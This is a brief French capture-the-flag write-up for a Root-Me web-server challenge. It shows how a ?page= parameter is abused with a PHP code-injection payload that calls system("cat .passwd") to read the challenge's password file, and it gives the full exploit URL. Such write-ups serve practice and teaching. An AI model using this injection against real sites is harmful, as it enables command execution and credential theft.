En cliquant sur les onglets, on voit qu'un paramètre ?page= apparaît.
On peut alors modifier l'URL en faisant appel à system()

Payload = `' and die(system("cat .passwd")) or '`
URL finale = `challenge01.root-me.org/web-serveur/ch47/index.php?page=home' and die(system("cat .passwd")) or '`